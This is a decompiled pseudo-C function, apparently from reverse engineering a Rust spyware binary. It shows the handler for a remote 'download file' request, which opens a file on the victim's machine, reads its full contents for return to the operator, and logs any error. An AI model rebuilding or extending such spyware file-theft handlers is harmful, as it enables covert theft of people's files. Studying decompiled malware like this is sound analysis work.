long long spyware::actions::basic_info::download_file_message(struct_0 *a0, unsigned long long a1)
{
    unsigned long long v0;  // [bp-0xc8]
    void* v1;  // [bp-0xc0], Other Possible Types: unsigned int, unsigned long long
    unsigned int v2;  // [bp-0xc0]
    unsigned long long v3;  // [bp-0xc0]
    unsigned long long v4;  // [bp-0xb8]
    void* v5;  // [bp-0xb0], Other Possible Types: unsigned long long
    unsigned long long v6;  // [bp-0xa8]
    unsigned long long v7;  // [bp-0xa0]
    void* v8;  // [bp-0x98], Other Possible Types: unsigned long
    unsigned int v9;  // [bp-0x94]
    unsigned long long v10;  // [bp-0x90]
    void* v11;  // [bp-0x88], Other Possible Types: char *
    unsigned long long v12;  // [bp-0x80]
    void* v13;  // [bp-0x78]
    char v14;  // [bp-0x68]
    unsigned int v15;  // [bp-0x64]
    unsigned long long v16;  // [bp-0x60]
    unsigned long long v17;  // [bp-0x58]
    unsigned long long v18;  // [bp-0x50]
    char *v19;  // [bp-0x48]
    unsigned long long v20;  // [bp-0x40]
    char v21;  // [bp-0x38]
    unsigned long long v23;  // r15
    unsigned long v24;  // r15
    unsigned long long v26;  // rdx

    if (::0x454a00::core::sync::atomic::atomic_load() >= 4)
    {
        v17 = a1;
        v18 = <alloc::string::String as core::fmt::Display>::fmt;
        v8 = &g_4b9810;
        v10 = 2;
        v13 = 0;
        v11 = &v17;
        v12 = 1;
        v3 = "spyware::actions::basic_infoHandling download file request: path \"\"Could not read file \"\", error \"";
        v4 = 28;
        v5 = "spyware::actions::basic_infoHandling download file request: path \"\"Could not read file \"\", error \"";
        v6 = 28;
        v7 = log::__private_api::loc(&g_4b9860);
        log::__private_api::log(&(char)v8, 4, &v3);
    }
    v14.open(a1);
    if ((v14 & 1))
    {
        v23 = v16;
        v0 = v23;
        if (::0x454a00::core::sync::atomic::atomic_load())
        {
            v21.spec_to_string(&v0);
            v17 = a1;
            v18 = <alloc::string::String as core::fmt::Display>::fmt;
            v19 = &v21;
            v20 = <alloc::string::String as core::fmt::Display>::fmt;
            v8 = &g_4b9830;
            v10 = 3;
            v13 = 0;
            v11 = &v17;
            v12 = 2;
            v1 = "spyware::actions::basic_infoHandling download file request: path \"\"Could not read file \"\", error \"";
            v4 = 28;
            v5 = "spyware::actions::basic_infoHandling download file request: path \"\"Could not read file \"\", error \"";
            v6 = 28;
            v7 = log::__private_api::loc(&g_4b9890);
            log::__private_api::log(&(char)v8, 1, &v1);
            ::0x454840::core::ptr::drop_in_place<alloc::string::String>(&v21);
            v23 = v0;
        }
        v1 = 0;
        v4 = 1;
        v5 = 0;
        ::0x4545b0::std::io::error::repr_bitpacked::decode_repr(&(char)v8, v23);
        v24 = (char)v8;
        (char)v8.spec_to_string(&v0);
        a0->field_28 = v11;
        *((int128_t *)&a0->field_18) = *((int128_t *)&v8);
        a0->field_10 = 0;
        a0->field_0 = *((int128_t *)&v1);
        a0->field_30 = -(0 < (v24 & 255)) | v9;
        ::0x454850::core::ptr::drop_in_place<std::io::error::Error>(&v0);
    }
    else
    {
        v1 = v15;
        v8 = 0;
        v10 = 1;
        v11 = 0;
        v1.read_to_end(&(char)v8).unwrap(v26);
        a0->field_10 = 0;
        a0->field_0 = *((int128_t *)&v8);
        *((unsigned long long *)&a0->field_18) = 0x8000000000000000;
        core::ptr::drop_in_place<std::fs::File>(v2);
    }
    ::0x454940::core::ptr::drop_in_place<spyware::communication::messages::DownloadFileRequest>(a1);
    return a0;
}
